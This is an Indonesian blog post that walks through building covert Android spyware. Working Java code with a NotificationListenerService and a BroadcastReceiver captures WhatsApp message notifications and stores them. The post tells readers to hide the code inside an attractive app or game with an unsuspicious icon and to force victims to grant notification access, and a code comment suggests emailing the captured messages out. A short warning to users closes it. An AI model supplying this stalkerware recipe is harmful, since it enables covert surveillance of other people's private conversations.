---
id: 3729
title: 'Menyadap aktivitas Chatting via Push Notification'
date: '2018-01-17T05:38:46+00:00'
author: 'Hangga Aji Sayekti'
layout: post
guid: 'https://hangga.github.io/blog/?p=3729'
permalink: /2018/01/17/mengintip-chatting-via-push-notification/
image: /wp-content/uploads/2018/01/lebanon-army-spyware-700.png
categories:
    - Android
    - Coding
tags:
    - mengintip
    - menyadap
    - 'menyadap android'
    - 'menyadap whatsapp'
    - penyadapan
    - sadap
---

Beberapa waktu lalu pernah *gayeng* ketika orang-orang pada *ngobrol* tentang penyadapan percakapan di dunia maya yang kemudian dikait-kaitkan dengan isu makar terhadap NKRI. *Owalah* benar-benar tidak menarik untuk dibahas, *njelehi tenan*. Tapi yang menarik bagi saya justeru di bagian sadap-sadapnya ini.

Nah, terlepas dari semua bahasan yang *njelehi* tersebut, mari kita mbahas ini saja, sadap-sadapan he3x. Mungkin ini salah satu trik yang dapat dilakukan untuk menyadap(lebih tepatnya *nginjen* a.k.a mengintip karena tak semua bisa kelihatan) aktivitas *chatting* *device android*. Yaitu dengan cara merekam log aktivitas pesan melalui *push notification*.

Namun perlu diketahui bahwa dalam hal ini ada dua kemungkinan, bisa berhasil bisa juga tidak. Bisa berhasil jika pemilik *device* meng-*enable* setelan *notification settings*. Jika tidak, yasudah anda tidak dapat pamer ke calon mertua. Yang jelas tak se-*keren* aksi *hacker* di filem-filem. *He3x..*

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/4-hacker-paling-berbahaya-di-dunia-nomor-3-mampu-jebol-pertahanan-nasa-ODh3g0SCLQ-700x367.jpg)sumber: https://img.okezone.com

*Push Notification* adalah sebuah notifikasi atau pemberitahuan instan yang di *push* langsung dari *server/back end* ke antarmuka pengguna aplikasi (desktop/mobile).

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/push-notifications-network-diagram-700x395.png)

Skema alur Push Notification, Sumber : https://docs.pivotal.io/push/1-9/assets/push-notifications-network-diagram.png

Notifikasi biasanya memiliki *title* berisi judul notifikasi, *package name* berisi nama *package* aplikasi penerima notifikasi, dan *text* yang berisi pesan isi notifikasi. Nah ketiga *property* inilah yang akan kita ambil informasinya.

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/push-notification-1-contoh.png)

Contoh Push Notification dari sisi antar muka pengguna pada aplikasi mobile.
## Skenario penyadapan

Sebelum melakukan penyadapan, eh pengintipan ding, persiapkanlah rencana dengan matang. Luruskan niat semata-mata untuk ber*experimen* dan menambah ilmu. he3x.. Bukan untuk menebar fitnah dan kejahatan. Pikirkan juga dosanya he3x.

1. **Membuat aplikasi penyadap** atau apalah istilahnya, yang penting berupa file .apk, dapat berupa aplikasi menarik atau game namun di dalamnya terdapat *script* penyadap. Ha3x. Silahkan gunakan ide kreatif anda masing-masing.
2. **Gunakan *icon* yang menarik dan tidak mencurigakan**. Ini penting, agar user tidak curiga akan niat busuk Anda. Ha3x..
3. **Paksa user untuk mengaktifkan** ***notification access**.* Ini hukumnya wajib. Pokoknya bagaimana caranya, user harus mengaktifkan *permission* ini.

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/settings-700-700x949.png)

## *Script* penyadap  


Android SDK menyediakan kelas yang sangat keren yaitu ***NotificationListenerService.java***, sebuah *service* yang menangani notifikasi. Anda bisa meng*import*nya seperti cara biasa.

```
import android.service.notification.NotificationListenerService;
```

Kemudian disini sy membuat sebuah kelas bernama ***NotificationService*** turunan dari ***NotificationListenerService***.

```
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import com.waspy.sayekti.waspy.R;

/**
 * Created by sayekti on 10/13/17.
 */

public class NotificationService extends NotificationListenerService {

    private Context context;
    private static boolean isNotificationAccessEnabled = false;

    public static boolean isNotificationAccessEnabled() {
        return isNotificationAccessEnabled;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
    }

    @Override
    public IBinder onBind(Intent intent) {
        IBinder mIBinder = super.onBind(intent);
        isNotificationAccessEnabled = true;
        return mIBinder;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        boolean mOnUnbind = super.onUnbind(intent);
        isNotificationAccessEnabled = false;
        return mOnUnbind;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {


        String pack = sbn.getPackageName();
        String ticker = sbn.getNotification().tickerText.toString();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title");
        String text = extras.getCharSequence("android.text").toString();

        Log.i("yaktest"+"Package",pack);
        Log.i("yaktest"+"Ticker",ticker);
        Log.i("yaktest"+"Title",title);
        Log.i("yaktest"+"Text",text);

        Intent msgrcv = new Intent("Msg");
        msgrcv.putExtra("package", pack);
        msgrcv.putExtra("ticker", ticker);
        msgrcv.putExtra("title", title);
        msgrcv.putExtra("text", text);

        LocalBroadcastManager.getInstance(context).sendBroadcast(msgrcv);

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg","Notification Removed");
    }
}
```

Kemudian jangan lupa tambahkan pada ***AndroidManifest.xml***

```
<service
            android:name=".service.NotificationService"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
</service>
```

Kemudian dibutuhkan sebuah ***BroadcastReceiver*** yang fungsinya sebagai penerima *broadcast* dan disini kita dapat melakukan filter sesuai nama *package* yang akan kita tangkap notifikasinya. Misalnya *package* yang akan anda intip adalah ***com.whatsapp*** a.k.a [***whatsapp***](https://www.whatsapp.com/?l=id) punya. Nah inilah inti dari teknik yang kita bahas. Jadi dalam *BroadcastReceiver* inilah penyadapan terhadap sebuah pesan notifikasi dilakukan.

```
 private BroadcastReceiver onNotice = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            if (!isRunning) isRunning = true;
            final String pack = intent.getStringExtra("package");
            final String title = intent.getStringExtra("title");
            final String ticker = intent.getStringExtra("ticker");
            final String text = intent.getStringExtra("text");

            if (pack.equalsIgnoreCase("com.whatsapp")) {

                /**
                 * This is just an example, incoming messages are stored in the realm database.
                 * You can also experiment for example incoming messages are sent to your email as a spy.
                 */

                realm.beginTransaction();
                Doo doo = realm.createObject(Doo.class, UUID.randomUUID().toString());
                doo.setPackageName(pack);
                doo.setTitle(title);
                doo.setTicker(ticker);
                doo.setText(text);
                realm.commitTransaction();

            }
        }
};
```

Ini baru contoh *ecek-ecek* dan tentunya masih bisa anda kembangkan sendiri dan lebih keren lagi.

Kemudian untuk menjalankan dan mematikan dapat menggunakan ***LocalBroadcastManager***.

Start Service :

```
LocalBroadcastManager.getInstance(MainActivity.this).registerReceiver(onNotice, new IntentFilter("Msg"));
```

Stop Service :

```
LocalBroadcastManager.getInstance(MainActivity.this).unregisterReceiver(onNotice);
```

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/WhatsApp-Image-2017-10-30-at-16.41.49.jpeg)

*Log* pada *IDE Android Studio*

![](https://hangga.github.io/blog/wp-content/uploads/2018/01/WhatsApp-Image-2017-10-30-at-16.39.14-700x1244.jpeg)

Contoh tampilan aplikasi *WaSpy*

## Hikmah dan pelajaran

> …bagi anda pengguna awam berhati-hatilah meng*install* aplikasi atau *game* siapa tahu didalamnya terdapat *script* penyadap/pengintai

Mari kita ambil hikmah dari postingan yang acak-acakan ini. Setidaknya ada sedikit pelajaran yang dapat kita ambil hikmahnya. Bagi *developer* sangat memungkinkan membuat aplikasi semacam ini, sehingga bagi anda pengguna awam berhati-hatilah meng*install* aplikasi atau *game* siapa tahu didalamnya terdapat *script* penyadap/pengintai. Jangan sampai obrolan via chatting dengan istri muda anda tersebar kemana-mana gara-gara keteledoran anda sendiri.

Sekian, selamat ber*experimen*.

\[dl url=”https://github.com/hangga/waspy” title=”Checkout Source Lengkap” desc=”by : Hangga Aji Sayekti” target=”\_blank”\]